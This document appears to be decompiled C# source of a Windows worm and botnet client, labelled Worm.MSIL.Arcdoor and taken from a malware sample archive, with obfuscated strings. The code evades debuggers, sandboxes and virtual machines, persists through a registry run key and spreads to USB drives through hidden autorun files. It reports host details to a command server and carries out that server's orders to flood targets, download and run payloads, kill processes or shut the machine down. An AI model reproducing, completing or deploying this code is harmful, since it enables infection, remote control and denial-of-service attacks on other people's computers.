// Decompiled with JetBrains decompiler
// Type: 
// Assembly: Server, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 9569351C-F5E3-4236-91AC-2AEE7C964AEF
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Worm.MSIL.Arcdoor.vqy-910dbff7657bb46b4bc3c388dbad3449c49288a2d745c58617744728da450e6b.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Management;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

internal sealed class \u0002
{
  private static string \u0002 = \u000E.\u0002(-94706458);
  private static string \u0003 = \u000E.\u0002(-94706634);
  private static string \u0005 = \u000E.\u0002(-94706648);
  private static bool \u0008 = true;
  private static bool \u0006 = true;
  private static bool \u000E = true;
  private static bool \u000F = false;
  private static bool \u0002\u2000 = true;
  private static bool \u0003\u2000 = false;
  private static bool \u0005\u2000 = true;
  private static bool \u0008\u2000 = true;
  private static string \u0006\u2000 = \u000E.\u0002(-94706608);
  private static bool \u000E\u2000 = true;
  private static string \u000F\u2000 = \u000E.\u0002(-94706634);
  private static string \u0002\u2001 = \u000E.\u0002(-94706600);
  private static string \u0003\u2001 = Environment.MachineName;
  private static string \u0005\u2001 = \u0002.\u000E();
  private static string \u0008\u2001 = CultureInfo.InstalledUICulture.EnglishName;
  private static string \u0006\u2001 = \u0002.\u0002(\u0002.\u0003());

  public static bool \u0002(string _param0) => Process.GetProcessesByName(_param0).Length > 0;

  public static string \u0002()
  {
    ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(\u000E.\u0002(-94707052), \u000E.\u0002(-94707067));
    string empty = string.Empty;
    foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
      empty = Convert.ToString(managementBaseObject[\u000E.\u0002(-94707025)]);
    return empty;
  }

  private static string \u0002(string _param0, string _param1)
  {
    ServicePointManager.Expect100Continue = false;
    WebRequest webRequest = WebRequest.Create(_param0);
    webRequest.ContentType = \u000E.\u0002(-94707007);
    webRequest.Method = \u000E.\u0002(-94706967);
    byte[] bytes = Encoding.ASCII.GetBytes(_param1);
    webRequest.ContentLength = (long) bytes.Length;
    Stream requestStream = webRequest.GetRequestStream();
    requestStream.Write(bytes, 0, bytes.Length);
    requestStream.Close();
    WebResponse response = webRequest.GetResponse();
    return response == null ? (string) null : new StreamReader(response.GetResponseStream()).ReadToEnd().Trim();
  }

  public static string \u0003() => \u0002.\u0005() + \u0002.\u0008() + \u0002.\u0006();

  public static string \u0005()
  {
    ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(\u000E.\u0002(-94707052), \u000E.\u0002(-94707180));
    string empty = string.Empty;
    foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
      empty = Convert.ToString(managementBaseObject[\u000E.\u0002(-94707120)]);
    return empty;
  }

  public static string \u0008()
  {
    ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(\u000E.\u0002(-94707052), \u000E.\u0002(-94707067));
    string empty = string.Empty;
    foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
      empty = Convert.ToString(managementBaseObject[\u000E.\u0002(-94707025)]);
    return empty;
  }

  public static string \u0006()
  {
    ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(\u000E.\u0002(-94707052), \u000E.\u0002(-94707134));
    string empty = string.Empty;
    foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
      empty = Convert.ToString(managementBaseObject[\u000E.\u0002(-94707098)]);
    return empty;
  }

  public static string \u0002(string _param0)
  {
    switch (_param0)
    {
      case null:
        return string.Empty;
      default:
        if (_param0.Length != 0)
        {
          byte[] hash = new MD5CryptoServiceProvider().ComputeHash(Encoding.Default.GetBytes(_param0));
          StringBuilder stringBuilder = new StringBuilder();
          for (int index = 0; index < hash.Length; ++index)
            stringBuilder.Append(hash[index].ToString(\u000E.\u0002(-94706791)));
          return stringBuilder.ToString();
        }
        goto case null;
    }
  }

  public static string \u000E()
  {
    OperatingSystem osVersion = Environment.OSVersion;
    string str = string.Empty;
    if (osVersion.Platform == PlatformID.Win32Windows)
      goto label_18;
label_3:
    if (osVersion.Platform == PlatformID.Win32NT)
    {
      if (osVersion.Version.Major == 4)
        str = \u000E.\u0002(-94706780);
      if (osVersion.Version.Major == 5)
      {
        switch (osVersion.Version.Minor)
        {
          case 0:
            str = \u000E.\u0002(-94706727);
            break;
          case 1:
            str = \u000E.\u0002(-94706740);
            break;
          case 2:
            str = \u000E.\u0002(-94706691);
            break;
        }
      }
      if (osVersion.Version.Major == 6)
      {
        switch (osVersion.Version.Minor)
        {
          case 0:
            str = \u000E.\u0002(-94706921);
            break;
          case 1:
            str = \u000E.\u0002(-94706933);
            break;
        }
      }
    }
    if (str == string.Empty)
      str = \u000E.\u0002(-94706885);
    return str;
label_18:
    if (osVersion.Version.Minor == 10)
      str = \u000E.\u0002(-94706814);
    if (osVersion.Version.Minor == 90)
    {
      str = \u000E.\u0002(-94706765);
      goto label_3;
    }
    else
      goto label_3;
  }

  private static void \u0002(string[] _param0)
  {
    if (\u0002.\u0008)
    {
      try
      {
        if (Debugger.IsAttached)
          return;
      }
      catch
      {
      }
    }
    if (\u0002.\u0006)
    {
      try
      {
        long ticks = DateTime.Now.Ticks;
        Thread.Sleep(10);
        if (DateTime.Now.Ticks - ticks < 10L)
          return;
      }
      catch
      {
      }
    }
    if (\u0002.\u000E)
    {
      try
      {
        Form form = new Form();
        form.Text = \u000E.\u0002(-94706852);
        form.Opacity = 0.0;
        form.ShowInTaskbar = false;
        form.Show();
        if (form.Text == \u000E.\u0002(-94706873))
          return;
        form.Close();
        string[] strArray1 = new string[12]
        {
          \u000E.\u0002(-94706822),
          \u000E.\u0002(-94706836),
          \u000E.\u0002(-94707554),
          \u000E.\u0002(-94707536),
          \u000E.\u0002(-94707521),
          \u000E.\u0002(-94707538),
          \u000E.\u0002(-94707491),
          \u000E.\u0002(-94707508),
          \u000E.\u0002(-94707461),
          \u000E.\u0002(-94707478),
          \u000E.\u0002(-94707691),
          \u000E.\u0002(-94707712)
        };
        foreach (string str in strArray1)
        {
          if (Environment.UserName == str)
            return;
        }
        string[] strArray2 = new string[7]
        {
          \u000E.\u0002(-94707701),
          \u000E.\u0002(-94707649),
          \u000E.\u0002(-94707630),
          \u000E.\u0002(-94707646),
          \u000E.\u0002(-94707596),
          \u000E.\u0002(-94707614),
          \u000E.\u0002(-94707601)
        };
        foreach (string str in strArray2)
        {
          if (\u0002.\u0002(str))
            return;
        }
      }
      catch
      {
      }
    }
    if (\u0002.\u000F)
    {
      try
      {
        foreach (Process process in Process.GetProcessesByName(\u000E.\u0002(-94707299)))
          process.Kill();
        string[] strArray = new string[13]
        {
          \u000E.\u0002(-94707317),
          \u000E.\u0002(-94707269),
          \u000E.\u0002(-94707287),
          \u000E.\u0002(-94707244),
          \u000E.\u0002(-94707262),
          \u000E.\u0002(-94707249),
          \u000E.\u0002(-94707203),
          \u000E.\u0002(-94707219),
          \u000E.\u0002(-94707432),
          \u000E.\u0002(-94707451),
          \u000E.\u0002(-94707407),
          \u000E.\u0002(-94707394),
          \u000E.\u0002(-94707416)
        };
        foreach (string str in strArray)
        {
          if (\u0002.\u0002(str))
            return;
        }
      }
      catch
      {
      }
    }
    if (\u0002.\u0002\u2000)
    {
      try
      {
        string[] strArray = new string[4]
        {
          \u000E.\u0002(-94707370),
          \u000E.\u0002(-94707336),
          \u000E.\u0002(-94706024),
          \u000E.\u0002(-94706037)
        };
        foreach (string str in strArray)
        {
          if (\u0002.\u0002() == str)
            return;
        }
      }
      catch
      {
      }
    }
    if (\u0002.\u0008\u2000)
    {
      try
      {
        Thread.Sleep(Convert.ToInt32(\u0002.\u0006\u2000) * 1000);
      }
      catch
      {
      }
    }
    if (\u0002.\u000E\u2000)
    {
      try
      {
        Process.GetProcessesByName(\u0002.\u000F\u2000)[0].Kill();
      }
      catch
      {
      }
    }
    try
    {
      FileStream fileStream1 = new FileStream(Process.GetCurrentProcess().MainModule.FileName, FileMode.Open, FileAccess.Read);
      byte[] buffer = new byte[fileStream1.Length];
      fileStream1.Read(buffer, 0, buffer.Length);
      fileStream1.Close();
      FileStream fileStream2 = new FileStream(Environment.GetEnvironmentVariable(\u000E.\u0002(-94706016)) + \u000E.\u0002(-94706005) + \u0002.\u0003, FileMode.Create);
      fileStream2.Write(buffer, 0, buffer.Length);
      fileStream2.Close();
      fileStream2.Dispose();
    }
    catch
    {
    }
    try
    {
      string name = \u000E.\u0002(-94705965);
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, true);
      registryKey.SetValue(\u000E.\u0002(-94705945), (object) (Environment.GetEnvironmentVariable(\u000E.\u0002(-94706016)) + \u000E.\u0002(-94706005) + \u0002.\u0003));
      registryKey.Close();
    }
    catch
    {
    }
    if (\u0002.\u0005\u2000)
    {
      try
      {
        foreach (DriveInfo drive in DriveInfo.GetDrives())
        {
          if (drive.DriveType == DriveType.Removable)
          {
            string fileName = Process.GetCurrentProcess().MainModule.FileName;
            if (System.IO.File.Exists(drive.Name + \u000E.\u0002(-94706148)))
              System.IO.File.Delete(drive.Name + \u000E.\u0002(-94706148));
            FileStream fileStream3 = new FileStream(fileName, FileMode.Open, FileAccess.Read);
            byte[] buffer = new byte[fileStream3.Length];
            fileStream3.Read(buffer, 0, buffer.Length);
            fileStream3.Close();
            FileStream fileStream4 = new FileStream(drive.Name + \u000E.\u0002(-94706148), FileMode.Create);
            fileStream4.Write(buffer, 0, buffer.Length);
            fileStream4.Close();
            fileStream4.Dispose();
            System.IO.File.SetAttributes(drive.Name + \u000E.\u0002(-94706148), System.IO.File.GetAttributes(drive.Name + \u000E.\u0002(-94706148)) | FileAttributes.Hidden);
            if (System.IO.File.Exists(drive.Name + \u000E.\u0002(-94706162)))
              System.IO.File.Delete(drive.Name + \u000E.\u0002(-94706162));
            StreamWriter streamWriter = new StreamWriter(drive.Name + \u000E.\u0002(-94706162));
            streamWriter.WriteLine(\u000E.\u0002(-94706144));
            streamWriter.WriteLine(\u000E.\u0002(-94706096));
            streamWriter.Close();
            System.IO.File.SetAttributes(drive.Name + \u000E.\u0002(-94706162), System.IO.File.GetAttributes(drive.Name + \u000E.\u0002(-94706162)) | FileAttributes.Hidden);
          }
        }
      }
      catch
      {
      }
    }
    if (\u0002.\u0003\u2000 & !Path.GetFileName(Application.ExecutablePath).Equals(\u0002.\u0003))
    {
      try
      {
        string str = \u000E.\u0002(-94706105) + (object) '"' + Environment.GetCommandLineArgs()[0] + (object) '"' + \u000E.\u0002(-94706053) + (object) '"' + Path.GetFileName(Application.ExecutablePath) + (object) '"' + \u000E.\u0002(-94706067) + Environment.SystemDirectory + (object) '"' + \u000E.\u0002(-94705783);
        TextWriter textWriter = (TextWriter) new StreamWriter(Environment.SystemDirectory + \u000E.\u0002(-94705729));
        textWriter.WriteLine(str);
        textWriter.Close();
        new Process()
        {
          StartInfo = {
            FileName = (Environment.SystemDirectory + \u000E.\u0002(-94705729)),
            UseShellExecute = false,
            CreateNoWindow = true
          }
        }.Start();
      }
      catch
      {
      }
      Environment.Exit(0);
    }
    try
    {
      string str = \u000E.\u0002(-94705711) + \u0002.\u0003\u2001 + \u000E.\u0002(-94705722) + \u0002.\u0002\u2001 + \u000E.\u0002(-94705675) + \u0002.\u0008\u2001 + \u000E.\u0002(-94705691) + \u0002.\u0005\u2001 + \u000E.\u0002(-94705900) + \u0002.\u0006\u2001;
      \u0002.\u0002(\u0002.\u0002, str);
    }
    catch
    {
    }
    while (true)
    {
      try
      {
        string str1 = \u000E.\u0002(-94705919) + \u0002.\u0006\u2001;
        string str2 = \u0002.\u0002(\u0002.\u0002, str1);
        if (str2.Length != 0)
          \u0002.\u0002(str2);
      }
      catch
      {
      }
      Thread.Sleep(Convert.ToInt32(\u0002.\u0005) * 60000);
    }
  }

  private static void \u0002(string _param0)
  {
    try
    {
      string[] strArray = _param0.Split('+');
      if (_param0.StartsWith(\u000E.\u0002(-94705868)))
      {
        try
        {
          \u0003.\u0003();
        }
        catch
        {
        }
        try
        {
          \u0003.\u0006 = strArray[1];
          \u0003.\u000E = Convert.ToInt32(strArray[2]);
          \u0003.\u000F = Convert.ToInt32(strArray[3]);
          \u0003.\u0002\u2000 = Convert.ToInt32(strArray[4]);
          \u0003.\u0002();
        }
        catch
        {
        }
      }
      if (_param0.StartsWith(\u000E.\u0002(-94705857)))
      {
        try
        {
          \u0005.\u0003();
        }
        catch
        {
        }
        try
        {
          \u0005.\u0006 = strArray[1];
          \u0005.\u0008 = Convert.ToInt32(strArray[2]);
          \u0005.\u0002();
        }
        catch
        {
        }
      }
      if (_param0.StartsWith(\u000E.\u0002(-94705877)))
      {
        try
        {
          \u0008.\u0003();
        }
        catch
        {
        }
        try
        {
          \u0008.\u0006 = strArray[1];
          \u0008.\u000E = Convert.ToInt32(strArray[2]);
          \u0008.\u000F = Convert.ToInt32(strArray[3]);
          \u0008.\u0002\u2000 = Convert.ToInt32(strArray[4]);
          \u0008.\u0003\u2000 = Convert.ToInt32(strArray[5]);
          \u0008.\u0002();
        }
        catch
        {
        }
      }
      if (_param0.StartsWith(\u000E.\u0002(-94705834)))
      {
        try
        {
          \u0006.\u0003();
        }
        catch
        {
        }
        try
        {
          \u0006.\u0006 = strArray[1];
          \u0006.\u000E = Convert.ToInt32(strArray[2]);
          \u0006.\u000F = Convert.ToInt32(strArray[3]);
          \u0006.\u0002\u2000 = Convert.ToInt32(strArray[4]);
          \u0006.\u0003\u2000 = Convert.ToInt32(strArray[5]);
          \u0006.\u0002();
        }
        catch
        {
        }
      }
      if (_param0.StartsWith(\u000E.\u0002(-94705854)))
      {
        try
        {
          \u0006.\u0003();
        }
        catch
        {
        }
        try
        {
          \u0005.\u0003();
        }
        catch
        {
        }
        try
        {
          \u0003.\u0003();
        }
        catch
        {
        }
        try
        {
          \u0008.\u0003();
        }
        catch
        {
        }
      }
      if (_param0.StartsWith(\u000E.\u0002(-94705805)))
      {
        try
        {
          new WebClient().DownloadFile(strArray[1], Environment.GetEnvironmentVariable(\u000E.\u0002(-94706016)) + \u000E.\u0002(-94705793));
          new Process()
          {
            StartInfo = {
              FileName = (Environment.GetEnvironmentVariable(\u000E.\u0002(-94706016)) + \u000E.\u0002(-94705793)),
              WindowStyle = ProcessWindowStyle.Hidden
            }
          }.Start();
        }
        catch
        {
        }
      }
      if (_param0.StartsWith(\u000E.\u0002(-94706542)))
      {
        try
        {
          Process.GetProcessesByName(strArray[1])[0].Kill();
        }
        catch
        {
        }
      }
      if (_param0.StartsWith(\u000E.\u0002(-94706530)))
      {
        try
        {
          ManagementClass managementClass = new ManagementClass(\u000E.\u0002(-94706546));
          managementClass.Scope.Options.EnablePrivileges = true;
          foreach (ManagementObject instance in managementClass.GetInstances())
          {
            ManagementBaseObject methodParameters = instance.GetMethodParameters(\u000E.\u0002(-94706518));
            methodParameters[\u000E.\u0002(-94706466)] = (object) 12;
            methodParameters[\u000E.\u0002(-94706486)] = (object) 0;
            instance.InvokeMethod(\u000E.\u0002(-94706518), methodParameters, (InvokeMethodOptions) null);
          }
        }
        catch
        {
        }
      }
      if (!_param0.StartsWith(\u000E.\u0002(-94706439)))
        return;
      Environment.Exit(0);
    }
    catch
    {
    }
  }
}
